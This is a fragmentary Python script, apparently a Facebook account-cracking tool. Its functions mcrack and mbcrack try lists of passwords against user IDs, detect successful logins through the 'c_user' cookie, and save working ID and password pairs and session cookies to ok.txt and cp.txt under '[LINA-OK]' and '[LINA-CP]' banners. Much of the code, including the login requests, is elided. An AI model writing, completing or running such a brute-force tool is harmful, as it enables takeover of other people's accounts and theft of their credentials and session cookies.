...
def mcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			...
			sys.stdout.write(f'\r \x1b[1;92m[LINA] [%s/%s] [OK][%s] [CP][%s] \r'%(loop,tl,len(ok),len(cp))),
			sys.stdout.flush()
    ...
    'viewport-width': '980',}
			...
			if 'c_user' in log_cookies:
				...
				cid = "1000"+coki1[0:11]
				print('\33[1;92m[LINA-OK] '+cid+' | '+ps+'\33[0;97m')
				...
				coki1 = coki.split("1000")[1]
				cid = "1000"+coki1[0:11]
				print('\33[1;93m[LINA-CP] '+cid+' | '+ps+'\33[0;97m')
...
def mbcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',}
			...
			if 'c_user' in log_cookies:
				...
				coki1 = coki.split("1000")[1]
				cid = "1000"+coki1[0:11]
				print(' \033[1;32m[LINA-OK] '+cid+' | '+ps+'\033[1;32m')
				print("\033[1;92m[•] Cookie: "+coki)
				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
				ok.append(cid)
				break
				...
				coki1 = coki.split("1000")[1]
				cid = "1000"+coki1[0:11]
				print(' \033[1;33m[LINA-CP] '+cid+' | '+ps+'\033[0;97m')
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cp.append(cid)
				break
			else:
